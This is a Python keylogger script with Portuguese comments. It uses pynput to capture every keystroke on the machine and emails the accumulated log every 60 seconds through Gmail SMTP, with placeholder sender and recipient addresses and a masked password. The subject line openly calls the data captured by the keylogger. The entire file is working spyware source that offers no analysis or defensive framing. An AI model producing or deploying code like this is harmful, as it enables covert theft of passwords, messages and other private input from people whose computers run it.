
from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

#1-  CONFIGURAÇÕES DO E-MAIL e conta criada
EMAIL_ORIGEM = "seuemail@gmail.com"
EMAIL_DESTINO= "seuemail@gmail.com"
SENHA_EMAIL = "xxxx xxxx xxxx xxxx"  # Dados mascarados por questão de segurança

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados 'MALANDRAMENTE' pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

#  def on_press(key):
#     global log
#     try:
#         log+= key.char 
#     except AttributeError:
#         if key == keyboard.Key.space:
#             log +=" "
#         elif key == keyboard.Key.enter:
#             log += "\n"
#         elif keyboard.Key.backspace:
#             log+="[<]"
#         else:
#             pass # Ignorar control, shift, etc...

def on_press(key):
    global log
    try:
        # Tenta pegar o caractere da tecla
        if key.char is not None:
            log += key.char
    except AttributeError:
        # Se for tecla especial (não tem .char), entra aqui
        # Você pode ignorar ou logar o nome da tecla
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            # log += f" [{key.name}] " # Opcional: logar outras teclas
            pass # Ignorar control, shift, etc...


# Inicia o keylogger e dispara - faz o envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()